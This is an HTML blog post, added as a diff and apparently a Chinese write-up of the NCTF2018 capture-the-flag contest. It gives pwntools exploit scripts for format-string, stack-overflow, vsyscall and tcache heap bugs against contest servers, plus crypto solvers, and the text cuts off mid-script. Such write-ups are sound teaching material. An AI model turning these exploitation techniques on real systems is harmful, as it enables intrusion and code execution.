@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="solo失败，丢了一半pwn没办法，马上考试，边看计网mooc边看题，还要做实验，先挑了些简单的，抢个pwn一血为团队打一下广告就撤了，其他的题还没来得及下载orz(希望计网别挂掉) 0x01 SMALL bug I任意地址写get shell 12345678from pwn import *p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,1100">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF2018">
+<meta property="og:url" content="http://yoursite.com/2018/11/27/NCTF2018/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="solo失败，丢了一半pwn没办法，马上考试，边看计网mooc边看题，还要做实验，先挑了些简单的，抢个pwn一血为团队打一下广告就撤了，其他的题还没来得及下载orz(希望计网别挂掉) 0x01 SMALL bug I任意地址写get shell 12345678from pwn import *p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,1100">
+<meta property="article:published_time" content="2018-11-27T04:54:01.000Z">
+<meta property="article:modified_time" content="2018-11-27T04:55:02.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>NCTF2018</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/11/29/BCTF-2018/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/11/19/LCTF2018-easy-heap-just-pwn/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/27/NCTF2018/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/27/NCTF2018/&text=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/27/NCTF2018/&is_video=false&description=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NCTF2018&body=Check out this article: http://yoursite.com/2018/11/27/NCTF2018/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/27/NCTF2018/&title=NCTF2018" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/27/NCTF2018/&name=NCTF2018&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-SMALL-bug-I"><span class="toc-number">1.</span> <span class="toc-text">0x01 SMALL bug I</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-SMALL-bug-II"><span class="toc-number">2.</span> <span class="toc-text">0x02 SMALL bug II</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-SMALL-bug-III"><span class="toc-number">3.</span> <span class="toc-text">0x03 SMALL bug III</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-sendyouflag"><span class="toc-number">4.</span> <span class="toc-text">0x04 sendyouflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-sendyousomething"><span class="toc-number">5.</span> <span class="toc-text">0x05 sendyousomething</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-baby-stack"><span class="toc-number">6.</span> <span class="toc-text">0x06 baby stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-babytcache"><span class="toc-number">7.</span> <span class="toc-text">0x07 babytcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-Calc"><span class="toc-number">8.</span> <span class="toc-text">0x08 Calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-easy-rsa"><span class="toc-number">9.</span> <span class="toc-text">0x09 easy rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0A-Substitute"><span class="toc-number">10.</span> <span class="toc-text">0x0A Substitute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0B-后门后门后门"><span class="toc-number">11.</span> <span class="toc-text">0x0B 后门后门后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0C-Our-16bit-wars"><span class="toc-number">12.</span> <span class="toc-text">0x0C Our 16bit wars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0C-基本操作-Reverse-Version"><span class="toc-number">13.</span> <span class="toc-text">0x0C 基本操作 Reverse Version.</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        NCTF2018
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-11-27T04:54:01.000Z" itemprop="datePublished">2018-11-27</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>solo失败，丢了一半pwn<br>没办法，马上考试，边看计网mooc边看题，还要做实验，先挑了些简单的，抢个pwn一血为团队打一下广告就撤了，其他的题还没来得及下载orz(希望计网别挂掉)</p>
+<h3 id="0x01-SMALL-bug-I"><a href="#0x01-SMALL-bug-I" class="headerlink" title="0x01 SMALL bug I"></a>0x01 SMALL bug I</h3><p>任意地址写get shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,11001)</span><br><span class="line">p.sendlineafter(&quot;Your Token:&quot;,&quot;50llRDHlw2UkO1aAZTemJAae6dBGdTgD&quot;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;:\n&quot;,&quot;a&quot;*8+p64(0x60108c))</span><br><span class="line">p.sendlineafter(&quot;:\n&quot;,&quot;1&quot;*8)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-SMALL-bug-II"><a href="#0x02-SMALL-bug-II" class="headerlink" title="0x02 SMALL bug II"></a>0x02 SMALL bug II</h3><p>常规的格式化字符串漏洞，改got表即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#p&#x3D;process(&quot;.&#x2F;smallbug2&quot;)</span><br><span class="line">p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,11003)</span><br><span class="line">p.sendlineafter(&quot;Your Token:&quot;,&quot;50llRDHlw2UkO1aAZTemJAae6dBGdTgD&quot;)</span><br><span class="line">e&#x3D;ELF(&quot;.&#x2F;smallbug2&quot;)</span><br><span class="line">p.recvuntil(&quot;?  \n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;)</span><br><span class="line">p.sendline(&quot;%7$saaaa&quot;+p64(e.got[&#39;puts&#39;]))</span><br><span class="line">addr&#x3D;u64(p.recv(6)+&quot;\x00\x00&quot;)-0x6f690</span><br><span class="line">one_gadget&#x3D;addr+0xf02a4</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">print hex(addr)</span><br><span class="line">print hex(one_gadget)</span><br><span class="line">payload&#x3D;&quot;%&quot;+str((one_gadget&gt;&gt;16)&amp;0xff)+&quot;c%9$hhn&quot;+&quot;%&quot;+str((one_gadget&amp;0xffff)-((one_gadget&gt;&gt;16)&amp;0xff))+&quot;c%10$hn&quot;</span><br><span class="line">p.sendline(payload.ljust(24,&quot;a&quot;)+p64(e.got[&#39;printf&#39;]+2)+p64(e.got[&#39;printf&#39;]))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-SMALL-bug-III"><a href="#0x03-SMALL-bug-III" class="headerlink" title="0x03 SMALL bug III"></a>0x03 SMALL bug III</h3><p>符号数与无符号数使用不规范<br>size构造-1使程序栈溢出，leak canary后复用栈溢出，第一次leak canary同时可以leak init，即可得到程序加载基址，然后再同样leak libc，ret to one_gadget即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#p&#x3D;process(&quot;.&#x2F;smallbug3&quot;)</span><br><span class="line">p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,10005)</span><br><span class="line">p.sendlineafter(&quot;Your Token:&quot;,&quot;50llRDHlw2UkO1aAZTemJAae6dBGdTgD&quot;)</span><br><span class="line">p.sendlineafter(&quot;:\n&quot;,&quot;-1&quot;)</span><br><span class="line">p.sendlineafter(&quot;:\n&quot;,&quot;a&quot;*17*8)</span><br><span class="line">p.recvuntil(&quot;aaaa\n&quot;)</span><br><span class="line">canary&#x3D;&quot;\x00&quot;+p.recv(7)</span><br><span class="line">addr&#x3D;u64(p.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(u64(canary)),hex(addr)</span><br><span class="line">p.sendafter(&quot;:\n&quot;,&quot;a&quot;*17*8+canary+&quot;a&quot;*8+p64(addr-0x104))</span><br><span class="line">p.sendlineafter(&quot;:\n&quot;,&quot;-1&quot;)</span><br><span class="line">p.sendafter(&quot;:\n&quot;,&quot;a&quot;*20*8+&quot;a&quot;*16*8)</span><br><span class="line">p.recvuntil(&quot;a&quot;*20*8+&quot;a&quot;*16*8)</span><br><span class="line">s&#x3D;u64(p.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(s)</span><br><span class="line">p.sendafter(&quot;:\n&quot;,&quot;a&quot;*17*8+canary+&quot;a&quot;*8+p64(s-0x3955b5))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-sendyouflag"><a href="#0x04-sendyouflag" class="headerlink" title="0x04 sendyouflag"></a>0x04 sendyouflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(&quot;%9s&quot;, &amp;v1);</span><br><span class="line">if ( v2 &#x3D;&#x3D; 0x61616161 )</span><br></pre></td></tr></table></figure>
+<p>栈溢出，nc连接后多输几个”a”覆盖掉v2即可</p>
+<h3 id="0x05-sendyousomething"><a href="#0x05-sendyousomething" class="headerlink" title="0x05 sendyousomething"></a>0x05 sendyousomething</h3><p>最常规栈溢出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,10002)</span><br><span class="line">p.sendlineafter(&quot;Your Token:&quot;,&quot;50llRDHlw2UkO1aAZTemJAae6dBGdTgD&quot;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;ROP\n&quot;,&quot;a&quot;*24+p64(0x400684))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x06-baby-stack"><a href="#0x06-baby-stack" class="headerlink" title="0x06 baby stack"></a>0x06 baby stack</h3><p>栈溢出，但程序检测输入只能是8的整数倍，程序有地址随机化，不能直接覆盖返回地址到后门，可以利用vsyscall地址固定来bypass：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line">pwndbg&gt; x&#x2F;10i 0xffffffffff600000 </span><br><span class="line">   0xffffffffff600000:	mov    rax,0x60</span><br><span class="line">   0xffffffffff600007:	syscall </span><br><span class="line">   0xffffffffff600009:	ret</span><br></pre></td></tr></table></figure>
+<p>汇编查看，实际后门在main函数：call xxxx的下一步，所以栈本身就有后门地址，只需要将在此地址前栈都覆盖成ret便可以作滑板(不断ret，最后到达后门get shell)，不过不能直接用0xffffffffff600009，会爆错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV (fault address 0x0)</span><br></pre></td></tr></table></figure>
+<p>请教了一下po叔：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsyscall只能从调用开始的地方开始，vsdo可以任意位置</span><br></pre></td></tr></table></figure>
+<p>具体原因有待查阅<br><strong>覆盖到0xffffffffff600007也不行，这时rax=0,rdi=0,rsi=stack_addr,rdx=1,同样报错(???)：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ► 0xffffffffff600007    syscall  &lt;SYS_read&gt;</span><br><span class="line">        fd: 0x0</span><br><span class="line">        buf: 0x7ffcad969720 ◂— 0xa &#x2F;* &#39;\n&#39; *&#x2F;</span><br><span class="line">        nbytes: 0x1</span><br><span class="line">   0xffffffffff600009    ret  </span><br><span class="line">Program received signal SIGSEGV (fault address 0x0)</span><br></pre></td></tr></table></figure>
+<p>所以只能完整调用一遍vsyscall中预先设置syscall再ret(与ret效果相同)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;process(&quot;.&#x2F;babystack&quot;)</span><br><span class="line">p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,10003)</span><br><span class="line">p.sendlineafter(&quot;Your Token:&quot;,&quot;50llRDHlw2UkO1aAZTemJAae6dBGdTgD&quot;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&quot;a&quot;*24+p64(0xffffffffff600000)*2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x07-babytcache"><a href="#0x07-babytcache" class="headerlink" title="0x07 babytcache"></a>0x07 babytcache</h3><p>程序存在uaf，利用tcache fd指向的是chunk的prev size来修改chunk，构造unsorted bin来leak libc ，然后double free改malloc hook为one_gadget即可(抢了一血，happy):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;babytcache&quot;)</span><br><span class="line">p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,10006)</span><br><span class="line">p.sendlineafter(&quot;:&quot;,&quot;50llRDHlw2UkO1aAZTemJAae6dBGdTgD&quot;)</span><br><span class="line">def add(note):</span><br><span class="line">   p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">   p.sendafter(&quot;:&quot;,note)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">   p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">   p.sendlineafter(&quot;:&quot;,str(index))</span><br><span class="line"></span><br><span class="line">for i in range(24):</span><br><span class="line">   add(&quot;kirin\n&quot;)</span><br><span class="line">for i in range(7):</span><br><span class="line">   delete(i+1)</span><br><span class="line"></span><br><span class="line">#fastbin</span><br><span class="line">delete(0)</span><br><span class="line">delete(7)</span><br><span class="line">add(&quot;kirin\n&quot;)</span><br><span class="line">add(p64(0x30)+p64(0x451)+&quot;\n&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)</span><br><span class="line">p.sendlineafter(&quot;:&quot;,&quot;0&quot;)</span><br><span class="line">addr&#x3D;u64(p.recv(6)+&quot;\x00\x00&quot;)-0x3ebca0</span><br><span class="line">one_gadget&#x3D;addr+0x10a38c</span><br><span class="line">malloc_hook&#x3D;addr+0x3ebc30</span><br><span class="line">delete(5)</span><br><span class="line">delete(5)</span><br><span class="line">add(p64(malloc_hook)+&quot;\n&quot;)</span><br><span class="line">add(&quot;aaa\n&quot;)</span><br><span class="line">add(p64(one_gadget)+&quot;\n&quot;)</span><br><span class="line">print hex(addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x08-Calc"><a href="#0x08-Calc" class="headerlink" title="0x08 Calc"></a>0x08 Calc</h3><p>替换汇编-&gt;运算符，eval即可(做的时候碰到这几个运算直接出了，应该会有其他的)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">key1&#x3D;[&quot;sub&quot;,&quot;mul&quot;,&quot;xor&quot;,&quot;add&quot;]</span><br><span class="line">key2&#x3D;[&quot;-&quot;,&quot;*&quot;,&quot;^&quot;,&quot;+&quot;]</span><br><span class="line">p&#x3D;remote(&quot;ctfgame.acdxvfsvd.net&quot;,30003)</span><br><span class="line">p.sendlineafter(&quot;Your Token:&quot;,&quot;50llRDHlw2UkO1aAZTemJAae6dBGdTgD&quot;)</span><br><span class="line">p.recvuntil(&quot;...\n&quot;)</span><br><span class="line">s&#x3D;p.recvuntil(&quot;\n&quot;).strip()</span><br><span class="line">for i in range(len(key1)):</span><br><span class="line">   s&#x3D;s.replace(key1[i],key2[i])</span><br><span class="line">p.sendline(str(eval(s)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x09-easy-rsa"><a href="#0x09-easy-rsa" class="headerlink" title="0x09 easy rsa"></a>0x09 easy rsa</h3><p>因式分解+爆破(最低位决定最低位)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(p+1)(q-1)&#x3D;pq-(p-q)-1</span><br><span class="line">(p-1)(q+1)&#x3D;pq+(p-q)-1</span><br></pre></td></tr></table></figure>
+<p>大概半分钟出结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n&#x3D;24585768801100871989460458412563674690545986652089097718040761783186739174559136657307807040444318337561194142282186006216583089898423180103199568738639814413601595196467099996734334212909157604318709957690532885862891927163713619932622153281344607898846228206181834468325246573910857887714824338949742479585089251882243488454602710292507668577598274622372304293403731722318890268908300308478539449464617438721833942643889296634768118375076052778833640986893990732882252524850152650060780854621796349622086656401914022236044924841914313726991826438982902866584892213702893596657746111940812657202364588469026832387629</span><br><span class="line">x&#x3D;14048479366496281701869293063643750801596179514889914988732592464154208813942939793532694949932787548745769133200541469022315588864587160064703369956054828780928008235304461825448872454098086255531582368864754318040219023548966787642948010656526691472780392631956031751285174567712974691729142190835749586660</span><br><span class="line">print n-x-1</span><br><span class="line">print n+x-1</span><br><span class="line">x1&#x3D;24585768801100871989460458412563674690545986652089097718040761783186739174559136657307807040444318337561194142282186006216583089898423180103199568738639814413601595196467099996734334212909157604318709957690532885862891927163713619932622153281344607898846228206181834468325246573910857887714824338949742479585075203402876992172900840999444024826796678442857414378414999129854736060094357368685006754514684651173088173510688755165745802786211465618768937616937935904101324516614848188235331982167698263366555074033049267918004705818365346939348878428326376175112111821070937564906460937373099682510635446278191082800968</span><br><span class="line">x2&#x3D;24585768801100871989460458412563674690545986652089097718040761783186739174559136657307807040444318337561194142282186006216583089898423180103199568738639814413601595196467099996734334212909157604318709957690532885862891927163713619932622153281344607898846228206181834468325246573910857887714824338949742479585103300361609984736304579585571312328399870801887194208392464314783044477722243248272072144414550226270579711777089838103790433963940639938898344356850045561663180533085457111886229727075894435877618238770778776554085143865463280514634774449639429558057672606334849628409031286508525631894093730659862581974288</span><br><span class="line">ans_p&#x3D;[0]</span><br><span class="line">ans_q&#x3D;[0]</span><br><span class="line">pp&#x3D;[]</span><br><span class="line">qq&#x3D;[]</span><br><span class="line">for bit in range(len(str(x))+1):</span><br><span class="line">    for i in range(len(ans_p)):</span><br><span class="line">        for p in range(10):</span><br><span class="line">            for q in range(10):</span><br><span class="line">                tmp_p&#x3D;ans_p[i]+p*(10**bit)</span><br><span class="line">                tmp_q&#x3D;ans_q[i]+q*(10**bit)</span><br><span class="line">                if (tmp_p+1)*(tmp_q-1)%(10**(bit+1))&#x3D;&#x3D;x1%(10**(bit+1)) and (tmp_p-1)*(tmp_q+1)%(10**(bit+1))&#x3D;&#x3D;x2%(10**(bit+1)):</span><br><span class="line">                    pp.append(tmp_p)</span><br><span class="line">                    qq.append(tmp_q)</span><br><span class="line">    ans_p,ans_q&#x3D;[],[]</span><br><span class="line">    for a in pp:</span><br><span class="line">        ans_p.append(a)</span><br><span class="line">    for a in qq:</span><br><span class="line">        ans_q.append(a)</span><br><span class="line">    print ans_p,ans_q</span><br><span class="line">    pp,qq&#x3D;[],[]</span><br></pre></td></tr></table></figure>
+<p><strong>得到p的可能解，用n%p==0得到唯一解,然后正常解即可:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import invert</span><br><span class="line"></span><br><span class="line">n&#x3D;24585768801100871989460458412563674690545986652089097718040761783186739174559136657307807040444318337561194142282186006216583089898423180103199568738639814413601595196467099996734334212909157604318709957690532885862891927163713619932622153281344607898846228206181834468325246573910857887714824338949742479585089251882243488454602710292507668577598274622372304293403731722318890268908300308478539449464617438721833942643889296634768118375076052778833640986893990732882252524850152650060780854621796349622086656401914022236044924841914313726991826438982902866584892213702893596657746111940812657202364588469026832387629</span><br><span class="line"></span><br><span class="line">e&#x3D;0x10001</span><br><span 